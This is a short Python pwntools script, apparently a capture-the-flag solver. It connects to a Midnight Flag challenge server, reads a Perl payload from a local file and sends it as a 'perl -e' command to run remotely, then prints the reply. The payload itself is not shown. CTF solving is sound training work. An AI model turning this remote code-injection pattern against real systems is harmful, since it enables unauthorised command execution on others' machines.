from pwn import *

r = remote("chall4.midnightflag.fr", 14970)
context.log_level = 'INFO'
with open('payload.pl', 'r') as f :
    payload = f.read().strip().replace('\n', '')
    cmd = f"perl -e '{payload}'"
    r.sendline(cmd)
print('ok')
print(r.recv(timeout=1))